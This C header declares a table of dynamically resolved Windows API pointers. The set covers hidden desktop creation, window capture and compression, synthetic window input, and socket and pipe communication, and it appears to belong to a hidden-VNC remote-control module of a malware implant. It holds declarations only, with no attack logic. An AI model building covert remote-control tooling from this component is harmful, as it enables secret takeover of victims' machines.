#pragma once

typedef struct
{
    struct
    {
        D_API( BitBlt );
        D_API( CreateCompatibleBitmap );
        D_API( CreateCompatibleDC );
        D_API( DeleteDC );
        D_API( DeleteObject );
        D_API( GetDIBits );
        D_API( SelectObject );
        D_API( SetStretchBltMode );
        D_API( StretchBlt );

    } gdi32;

    struct
    {
        D_API( GdipCreateBitmapFromHBITMAP );
        D_API( GdipCreateBitmapFromStream );
        D_API( GdipCreateHBITMAPFromBitmap );
        D_API( GdipDisposeImage );
        D_API( GdiplusShutdown );
        D_API( GdiplusStartup );
        D_API( GdipSaveImageToStream );

    } gdiplus;

    struct
    {
        D_API( CloseHandle );
        D_API( ConnectNamedPipe );
        D_API( CreateEventA );
        D_API( CreateNamedPipeA );
        D_API( CreateProcessA );
        D_API( CreateThread );
        D_API( GetVersionExA );
        D_API( SetEvent );
        D_API( TerminateThread );
        D_API( VirtualAlloc );
        D_API( VirtualFree );
        D_API( WaitForSingleObject );
        D_API( WriteFile );

    } kernel32;

    struct
    {
        D_API( free );
        D_API( malloc );
        D_API( vsnprintf );

    } msvcrt;

    struct
    {
        D_API( RtlCompressBuffer );
        D_API( RtlGetCompressionWorkSpaceSize );

    } ntdll;

    struct
    {
        D_API( CreateStreamOnHGlobal );

    } ole32;

    struct 
    {
        D_API( ChildWindowFromPoint );
        D_API( CloseDesktop );
        D_API( CreateDesktopA );
        D_API( FindWindowA );
        D_API( GetDesktopWindow );
        D_API( GetDC );
        D_API( GetMenuItemID );
        D_API( GetTopWindow );
        D_API( GetWindow );
        D_API( GetWindowLongA );
        D_API( GetWindowPlacement );
        D_API( GetWindowRect );
        D_API( IsWindowVisible );
        D_API( MenuItemFromPoint );
        D_API( MoveWindow );
        D_API( OpenDesktopA );
        D_API( PostMessageA );
        D_API( PrintWindow );
        D_API( PtInRect );
        D_API( RealGetWindowClassA );
        D_API( ReleaseDC );
        D_API( ScreenToClient );
        D_API( SendMessageA );
        D_API( SetThreadDesktop );
        D_API( SetWindowLongA );
        D_API( WindowFromPoint );

    } user32;

    struct
    {
        D_API( closesocket );
        D_API( connect );
        D_API( gethostbyname );
        D_API( htons );
        D_API( recv );
        D_API( send );
        D_API( socket );
        D_API( WSAStartup );

    } ws2_32;

} API, *PAPI;
